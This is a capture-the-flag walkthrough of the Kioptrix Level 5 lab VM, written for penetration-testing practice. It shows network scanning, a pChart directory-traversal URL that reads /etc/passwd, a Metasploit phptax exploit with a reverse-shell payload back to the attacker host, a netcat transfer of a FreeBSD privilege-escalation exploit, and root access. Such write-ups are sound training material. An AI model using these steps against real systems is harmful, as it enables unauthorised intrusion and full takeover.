# Kioptrix Level 5 Walkthrough

# Kioptrix level 5

## Setup

For the machine to assign an ip you must remove the network adapter and add it again.

## Resolution
### Vulnerability scanning and analysis
I start by doing a scan of the local network with arp-scan to discover the ip of the target machine.

```bash
arp-scan -I eth0 --localnet

-I -> indicate the interface 
--localnet -> we indicate to generate addresses from the interface configuration.
```

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled.png)

I get that the ip of my target is 192.168.66.163, so I do a port scan with nmap.
```bash
nmap -p- --open  -T5 -n -Pn -vvv 192.168.66.163 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:46 EDT
Initiating ARP Ping Scan at 15:46
Scanning 192.168.66.163 [1 port]
Completed ARP Ping Scan at 15:46, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:46
Scanning 192.168.66.163 [65535 ports]
Discovered open port 80/tcp on 192.168.66.163
Discovered open port 8080/tcp on 192.168.66.163
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 9.90% done; ETC: 15:48 (0:01:31 remaining)
Completed SYN Stealth Scan at 15:47, 53.95s elapsed (65535 total ports)
Nmap scan report for 192.168.66.163
Host is up, received arp-response (0.00015s latency).
Scanned at 2023-08-31 15:46:49 EDT for 54s
Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: 00:0C:29:5B:14:9E (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.25 seconds
           Raw packets sent: 131110 (5.769MB) | Rcvd: 50 (2.410KB)
```

I notice that ports 80 and 8080 are open, and I perform a second, more specific scan to obtain the version of the services running.
```bash
──(root㉿kali)-[/home/kali/vulnhub/OSCP/kioptrix_level_5]
└─# nmap -p80,8080 -sCV 192.168.66.163                        
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:49 EDT
Nmap scan report for 192.168.66.163
Host is up (0.00040s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open  http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:5B:14:9E (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
```

After reviewing the results I noticed that the version of mod_ssl/2.2.21 is vulnerable but the exploit for this vulnerability does not contain a valid version for FreeBSD apache 2.2.21 so it did not work.

I then went on to check the web with port 80.
![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%201.png)

And when I opened the source code of the page I discovered a url address.
![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%202.png)

When I opened it I discovered the following:

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%203.png)
### Exploitation
Searching what phpchart is I found out that it is a php library to display text data graphically.
Then I searched if there is any vulnerability for this version and I found the following page.
[Exploiting pChart 2.1.3 (Directory traversal & XSS)](https://vk9-sec.com/exploiting-pchart-2-1-3-directory-traversal-xss/)

Reading I see that it is vulnerable to directory traversal so I enter the following address and get the /etc/passwd file
```bash
http://192.168.66.163/pChart2.1.3/examples/index.php?Action=View&Script=/../../../../etc/passwd
```
Reading a little more the web I discover that FreeBSD operating systems have the Apache configuration file in the following path, so I will read it now.

```bash
/usr/local/etc/apache22/httpd.conf
```

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%204.png)

Observing the result and after trying a log poison without success I see that the configuration file shows an allowed User-Agent (Mozilla/4.0 Mozilla4 browser) and a virtualHost on port 8080.

Through a browser extension I change the user agent

[https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/](https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/)

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%205.png)

With the user agent changed I perform the web search with port 8080 and I see the following.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%206.png)

I click on phptax and the following page appears.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%207.png)

Searching for an exploit for phptax I find the following exploits

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%208.png)

I have decided to use metasploit so by executing the following series of commands I get a shell.

```bash
#start  metasploit
msfconsole -q
#exploit search
search phptax
#select exploit
use 0
#setup
options
set RHOSTS 192.168.66.163
set RPORT 8080
show advanced
set UserAgent Mozilla/4.0 Mozilla4_browser
set payload payload/cmd/unix/reverse
set LHOST 192.168.66.152
set LPORT 4444
run
```
### Privilege escalation
We obtain a shell and enumerate.

```bash
whoami
www
id
uid=80(www) gid=80(www) groups=80(www)
uname -a
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
```

After enumerating a little bit the next step I did was to search if there is any exploit for the FreeBSD version of the machine.

![Untitled](Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png)

There is an exploit to escalate privileges so I download it on my machine and then transfer it to the target machine with netcat.

```bash
searchsploit -m freebsd/local/26368.c
  Exploit: FreeBSD 9.0 < 9.1 - 'mmap/ptrace' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/26368
     Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c
    Codes: CVE-2013-2171, OSVDB-94414
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/vulnhub/OSCP/kioptrix_level_5/26368.c
```

I listen on my kali and connect from the target machine to perform the transfer in the /tmp directory.

```bash
#Kali
nc -lvp 4444 < 26368.c                            
listening on [any] 4444 ...

#kioptrix
nc -nv 192.168.66.152 4444 > 26368.c                                                                                                                                                                                                        
Connection to 192.168.66.152 4444 port [tcp/*] succeeded!
```

once transferred I compile the exploit and run it getting a shell as root

```bash
gcc 26368.c -o exploit
./exploit
whoami
root
id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
cat congrats.txt
If you are reading this, it means you got root (or cheated).
```

